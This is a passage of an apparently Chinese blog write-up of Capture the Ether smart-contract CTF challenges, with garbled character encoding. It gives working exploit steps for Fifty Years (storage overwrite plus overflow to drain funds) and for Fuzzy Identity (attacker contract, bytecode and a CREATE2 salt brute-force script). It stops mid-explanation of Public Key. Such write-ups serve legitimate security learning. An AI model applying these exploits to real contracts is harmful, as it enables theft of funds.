class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        owner &#x3D; player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;&#x3D; head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            &#x2F;&#x2F; Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution &#x3D; queue[index];</span><br><span class="line">            contribution.amount +&#x3D; msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; Append a new contribution. Require that each contribution unlock</span><br><span class="line">            &#x2F;&#x2F; at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;&#x3D; queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount &#x3D; msg.value;</span><br><span class="line">            contribution.unlockTimestamp &#x3D; timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        require(now &gt;&#x3D; queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total &#x3D; 0;</span><br><span class="line">        for (uint256 i &#x3D; head; i &lt;&#x3D; index; i++) &#123;</span><br><span class="line">            total +&#x3D; queue[i].amount;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Move the head of the queue forward so we don&#39;t have to loop over</span><br><span class="line">        &#x2F;&#x2F; already-withdrawn contributions.</span><br><span class="line">        head &#x3D; index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=tR-qQcNT_fY">100 Years</a>. I guess just listen to half of it.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é€šè¿‡å‰é¢å‡ å¤©é¢˜ï¼Œæˆ‘å¯ä»¥çŸ¥é“ä»¥ä¸‹æš‚æ—¶å¯ä»¥å¾—åˆ°ä¿¡æ¯ï¼š</p><ol><li><p>å‡½æ•°é‡Œä½¿ç”¨äº†storageå­˜å‚¨æ¥åˆå§‹åŒ–ä¸€ä¸ªcontributionç»“æ„ä½“ï¼Œ å› æ­¤æˆ‘ä»¬å¯ä»¥è¦†ç›– queue çš„é•¿åº¦ä»¥åŠ head çš„å€¼ã€‚</p><pre><code>  msg.valueè¦†ç›–slot(0) -&gt; queue.length  timestampè¦†ç›–slot(1) -&gt; head</code></pre></li><li><p>æº¢å‡ºæ¼æ´ï¼š <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code></p><p>queue çš„é•¿åº¦å¯æ§ï¼Œ åŠ¨æ€æ•°ç»„queue çš„å˜é‡æ‰€åœ¨çš„å­˜å‚¨ä½è®¡ç®—è§„åˆ™ä¸º <code>keccak256(slot) + index * elementsize</code> ,  <code>elementsize</code>  å³ä¸ºç»“æ„ä½“Contributionçš„size</p></li></ol><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li><p>å¯åŠ¨åˆçº¦ï¼Œæ­¤æ—¶ queue.length =1ï¼Œ head = 0</p></li><li><p>è°ƒç”¨ <code>upsert(1, 2**256-24*60*60)</code>  é€šè¿‡æº¢å‡ºç»•è¿‡ <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code> æ£€æŸ¥ï¼Œå³ 2**256 + 24 * 60 * 60 = 0ï¼›</p><p>æ­¤æ—¶ queue.length = 1 &amp; head = 2*<em>256-24</em>60*60</p></li><li><p>å†è°ƒç”¨ä¸€æ¬¡ upsert(2, 0) , è°ƒç”¨å, queue.length = 2 &amp; head = 0</p></li><li><p>æœ€åå–å‡ºæ‰€æœ‰ balance <code>withdraw(2)</code></p></li></ol><p>step1:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png"></a></p><p>step: 2</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png"></a></p><p>ç„¶ååœ¨æ‰§è¡Œwithraw çš„æ—¶å€™å‘ç°å¤±è´¥äº†ï¼Œé€šè¿‡è°ƒè¯•ä»¥åŠæŸ¥é˜…èµ„æ–™å‘ç°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contributionçš„amountå€¼å¹¶ä¸æ˜¯æˆ‘ä»¬ä¼ é€’çš„msg.valueçš„å€¼ï¼Œåœ¨å…¶åŸºç¡€ä¸Šè¿˜åŠ äº†1.å¼€å§‹æˆ‘ä¹Ÿä¸å¤ªæ˜ç™½ï¼Œåæ¥debugå‘ç°åŸæ¥queue.lengthä¹Ÿæ˜¯msg.value+1ï¼Œå› ä¸ºäºŒè€…å…±ç”¨ä¸€å—å­˜å‚¨ï¼Œåº”è¯¥æ˜¯queue.lengthå¢åŠ æ—¶ä¹Ÿä¿®æ”¹äº†amountçš„å€¼ï¼Œè‡³äºæ­¤å¤„queue.lengthä¸ºä½•+1ï¼Œåˆ™æ˜¯å› ä¸ºqueue.pushæ“ä½œï¼Œå› ä¸ºå…¶åœ¨æœ€åæ‰§è¡Œå¢æ·»å¯¹è±¡çš„ä»»åŠ¡ï¼Œæ·»åŠ ä»¥åå®ƒä¼šå°†queue.lengthè¿›è¡Œ+1æ“ä½œ</span><br><span class="line"></span><br><span class="line">è¿™æ ·ä¸€åˆ‡å°±è§£é‡Šçš„é€šäº†ï¼Œå…³é”®å°±æ˜¯è¿™é‡Œamountè¿›è¡Œäº†+1ï¼Œæ‰€ä»¥åœ¨withdrawæ˜¯æ‰€ç»Ÿè®¡çš„totaläº‹å®ä¸Šæ˜¯å¤§äºåˆçº¦æ‰€æ‹¥æœ‰çš„balanceï¼Œæ‰€ä»¥transferæ— æ³•æ‰§è¡Œï¼Œè¿™ä¸€ç‚¹ç¡®å®æœ‰ç‚¹éš¾åˆ°æˆ‘äº†ï¼Œå¿…é¡»æƒ³ä¸ªåŠæ³•æŠµæ¶ˆè¿™ä¸€æ­¥+1çš„æ“ä½œ</span><br><span class="line"></span><br><span class="line">å¾ˆå¿«ï¼Œæˆ‘æ„è¯†åˆ°æˆ‘å¯ä»¥åˆ©ç”¨valueæ¥è¦†ç›–å·²æœ‰çš„contributionï¼Œæ—¢ç„¶å‘1 weiä¼šåŠ 1ï¼Œé‚£æˆ‘å‘ä¸¤æ¬¡ï¼Œè¿™æ ·å¾—åˆ°çš„amountå°±æ˜¯2ï¼Œä¹Ÿå°±æ˜¯æˆ‘å®é™…å‘é€çš„weiæ•°ç›®ï¼Œæ‰€ä»¥æŠŠä¸Šé¢é‚£ä¸¤æ­¥å†™å…¥æ“ä½œéƒ½æ”¹æˆ1 weiä¸‹çš„æ“ä½œå³å¯ ã€‚</span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p><p><a href="https://www.anquanke.com/post/id/153375#h3-11">capture the ether write up(warmup and Math) - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="Account"><a href="#Account" class="headerlink" title="Account"></a>Account</h2><h3 id="1-Fuzzy-identity"><a href="#1-Fuzzy-identity" class="headerlink" title="1. Fuzzy identity"></a>1. Fuzzy identity</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This contract can only be used by me (smarx). I donâ€™t trust myself to remember my private key, so Iâ€™ve made it so whatever address Iâ€™m using in the future will work:</p><ol><li>I always use a wallet contract that returns â€œsmarxâ€ if you ask itsÂ <code>name</code>.</li><li>Everything I write has bad code in it, so my address always includes the hex stringÂ <code>badc0de</code>.</li></ol><p>To complete this challenge, steal my identity!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() &#x3D;&#x3D; bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr &#x3D; bytes20(_addr);</span><br><span class="line">        bytes20 id &#x3D; hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask &#x3D; hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask &#x3D;&#x3D; id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;&#x3D; 4;</span><br><span class="line">            id &lt;&lt;&#x3D; 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=8wxBLq_C2KQ">Research Me Obsessively</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è¦æ±‚ï¼š</p><ol><li><code> IName(addr).name() == bytes32(&quot;smarx&quot;);</code></li><li>åœ°å€ä¸­è¦å­˜åœ¨  <code>badc0de</code></li></ol><p>é€šè¿‡æŸ¥é˜…èµ„æ–™å¯ä»¥çŸ¥é“ï¼š</p><p>å‚è€ƒé»„çš®ä¹¦å…¬å¼(81)ï¼Œéƒ¨ç½²åˆçº¦æ—¶ï¼Œç›®æ ‡åœ°å€æœ‰ä¸¤ç§è®¡ç®—æ–¹å¼ï¼Œåˆ†åˆ«ä¸ºÂ <code>CREATE</code>Â å’ŒÂ <code>CREATE2</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png"></a></p><p>æˆ‘ä»¬é€šè¿‡ <code>CREATE2</code> çˆ†ç ´saltè®¡ç®—åˆçº¦åœ°å€ï¼ŒåŒ…å«badc0deå³å¯</p><ol><li>éƒ¨ç½²æ”»å‡»åˆçº¦çš„éƒ¨ç½²åˆçº¦åˆ©ç”¨create2è·å–åŒ…å«ç‰¹å®šå­—ç¬¦çš„æ”»å‡»åˆçº¦åœ°å€</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.12;</span><br><span class="line">contract FuzzyIdentitySolverDeployer &#123;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code, uint256 salt) public</span><br><span class="line">returns(address) &#123;</span><br><span class="line"></span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line"></span><br><span class="line">          addr :&#x3D; create2(0, add(code, 0x20), mload(code), salt)</span><br><span class="line">          if iszero(extcodesize(addr)) &#123;</span><br><span class="line"></span><br><span class="line">            revert(0, 0)</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²ä¸Šè¿°åˆçº¦å¹¶è·å–åˆçº¦åœ°å€ï¼š </p><ol start="2"><li>ç¼–è¯‘æ”»å‡»åˆçº¦ä»£ç ï¼Œ å¹¶è·å–æ”»å‡»åˆçº¦ä»£ç çš„ bytecode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IFuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function authenticate() external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function name() public pure returns (bytes32) &#123;</span><br><span class="line"></span><br><span class="line">        return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public &#123;</span><br><span class="line">        IFuzzyIdentityChallengeSolver(_addr).authenticate();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;linkReferences&quot;</span>: &#123;&#125;,</span><br><span class="line"><span class="attr">&quot;object&quot;</span>: <span class="string">&quot;608060405234801561001057600080fd5b5061019a806100206000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610084575b600080fd5b34801561005d57600080fd5b506100666100c7565b60405180826000191660001916815260200191505060405180910390f35b34801561009057600080fd5b506100c5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ef565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b50505050505600a165627a7a723058208dfe2548775f3de8273867b8111a10cf9a9ad2fbde6b7c8d41ececc20f7367380029&quot;</span>,</span><br><span class="line"><span class="attr">&quot;opcodes&quot;</span>: <span class="string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x84 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xEF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH32 0x736D617278000000000000000000000000000000000000000000000000000000 SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x380C7A67 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x167 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 DUP14 INVALID 0x25 0x48 PUSH24 0x5F3DE8273867B8111A10CF9A9AD2FBDE6B7C8D41ECECC20F PUSH20 0x6738002900000000000000000000000000000000 &quot;</span>,</span><br><span class="line"><span class="attr">&quot;sourceMap&quot;</span>: <span class="string">&quot;107:239:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;107:239:0;;;;;;;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]è®¡ç®—æ”»å‡»åˆçº¦åœ°å€</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="comment"># CREATE2</span></span><br><span class="line"><span class="comment"># keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create2</span>(<span class="params">deployer, salt_hexstr, hashed_bytecode</span>):</span></span><br><span class="line">    addr_hexbytes = Web3.keccak(hexstr=(<span class="string">&#x27;ff&#x27;</span> + deployer + salt_hexstr +</span><br><span class="line">hashed_bytecode))</span><br><span class="line">    addr = Web3.toHex(addr_hexbytes)[<span class="number">-40</span>:]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"><span class="comment"># expecting deployer=&#x27;aabbccdd&#x27; (20 bytes -&gt; 40 characters)</span></span><br><span class="line"><span class="comment"># salt = some decimal number</span></span><br><span class="line"><span class="comment"># bytecode = &#x27;aabbccddeeff...&#x27; (variable length)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2</span>(<span class="params">deployer, salt, bytecode</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(len(deployer) == <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(bytecode) % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">    salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2_search</span>(<span class="params">deployer, predicate, bytecode</span>):</span></span><br><span class="line">    salt = <span class="number">0</span></span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt += <span class="number">1</span></span><br><span class="line">        salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">        addr = _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line">        <span class="keyword">if</span> salt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;.&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> predicate(addr):</span><br><span class="line">            print(<span class="string">f&quot;\nFound a match after <span class="subst">&#123;salt&#125;</span> attempts: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">f&quot;Usage: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> deployer_addr &lt;salt |predicate&gt; bytecode&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a salt value, this script prints theaddress of the newly deployed contract based on the deployer address andbytecode hash.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE 42 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a predicate, this script will search for a salt value such that the new address satisfies the predicate.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE &#x27;lambda addr: \&quot;badc0de\&quot; inaddr.lower()&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Another predicate that may be useful: &#x27;lambda addr:addr.startswith(\&quot;0\&quot; * 8)&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    deployer_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> deployer_addr.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        deployer_addr = deployer_addr[<span class="number">2</span>:]</span><br><span class="line">    bytecode = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        salt = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">        print(create2(deployer_addr, salt, bytecode))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        predicate = eval(sys.argv[<span class="number">2</span>])</span><br><span class="line">        create2_search(deployer_addr, predicate, bytecode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><pre><code>é€šè¿‡è®¡ç®—å‡ºæ¥çš„åˆçº¦æ”»å‡»ç›®æ ‡åœ°å€</code></pre><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png"></a></p><h3 id="2-Public-Key"><a href="#2-Public-Key" class="headerlink" title="2. Public Key"></a>2. Public Key</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>Recall that an address is the last 20 bytes of the keccak-256 hash of the addressâ€™s public key.</p><p>To complete this challenge, find the public key for theÂ <code>owner</code>â€˜s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=Qp9JriLfH1w">Public Key Infrastructure</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®æä¾›æˆ‘ä»¬ä¸€ä¸ªåˆçº¦çš„åœ°å€ï¼Œè¦æ±‚æˆ‘ä»¬å¾—åˆ°è¯¥åœ°å€çš„å…¬é’¥ã€‚ è¿™é‡Œæ¶‰åŠåˆ°ä»¥å¤ªåŠçš„äº¤æ˜“ç­¾åç®—æ³•ã€‚å½“æˆ‘ä»¬çŸ¥é“ rã€sã€v å’Œ 